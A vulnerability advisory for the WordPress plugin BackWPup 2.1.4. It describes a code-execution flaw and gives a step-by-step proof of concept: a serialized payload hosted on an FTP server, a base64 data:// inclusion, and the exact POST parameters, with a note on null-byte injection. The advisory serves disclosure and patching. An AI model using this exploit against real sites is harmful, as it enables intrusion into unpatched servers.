Details.
========

A vulnerability has been discovered in the WordPress plugin BackWPup
2.1.4 which can be exploited to execute local or remote code on the
web server.

There is a lack of data validation on the BackWPUpJobTemp POST
parameter of job/wp_export_generate.php allowing an attacker to
specify FTP resources as input.

This resource is downloaded and deserialised by the wp_export_generate.php
script and variables from this deserialisation are later passed to
require_once.

Proof of Concept.
=================

Upload the following to a publicly accessible FTP server and
name it "file.txt.running".

a:2:{s:7:"WORKING";a:1:{s:5:"NONCE";s:3:"123";}s:8:"ABS_PATH";s:25:
"data://text/plain;base64,PD8gcGhwaW5mbygpOyBkaWUoKTs=";}

This serialised string creates an array containing:

$infile['WORKING'] = array();
$infile['WORKING']['NONCE'] = '123';
$infile['ABS_PATH'] =
'data://text/plain;base64,PD8gcGhwaW5mbygpOyBkaWUoKTs=';

Once uploaded ensure the FTP file is writeable and issue a POST to
"job/wp_export_generate.php" with the following parameters:

$_POST['BackWPupJobTemp'] = "ftp://user:password@10.2.0.128/file.txt";
$_POST['nonce'] = '123';
$_POST['type'] = 'getxmlexport';

The string included in $infile['ABS_PATH'] will then have "wp-load.php"
appended to it and passed to require_once.

In the above example the code contained in the base64 encoded string will
then be executed. The above code executes .phpinfo(); die();..
allow_URL_include will need to be on to allow to allow for remote file
inclusion, however local file inclusion could easily be achieved by using
null byte injection.

Solution.
=========
Upgrade to BackWPUp 2.1.5 of above.
